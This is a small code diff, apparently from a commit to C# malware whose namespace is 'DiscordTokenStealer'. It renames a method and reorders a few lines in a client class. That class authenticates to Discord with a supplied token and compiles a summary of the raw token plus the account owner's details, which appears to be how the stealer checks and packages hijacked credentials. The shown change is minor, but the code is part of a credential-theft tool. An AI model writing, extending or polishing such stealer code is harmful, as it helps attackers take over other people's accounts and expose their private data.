@@ -3,6 +3,7 @@ using System.Text;
 using System.Text.Json;
 
 namespace DiscordTokenStealer.Discord;
+
 public class DiscordClient : IDisposable
 {
     private readonly string _token;
@@ -18,14 +19,14 @@ public class DiscordClient : IDisposable
         _httpClient.DefaultRequestHeaders.TryAddWithoutValidation("Authorization", token);
     }
 
-    public async Task<string?> GetSummary(CancellationToken cts = default)
+    public async Task<string?> GetUserSummary(CancellationToken cts = default)
     {
-        StringBuilder sb = new StringBuilder();
         DiscordUser? user = await LoginAsync(cts);
         if (user == null)
         {
             return null;
         }
+        StringBuilder sb = new StringBuilder();
         sb.AppendLine($"\t{_token}");
         sb.AppendLine(user.ToString());
         return sb.ToString();
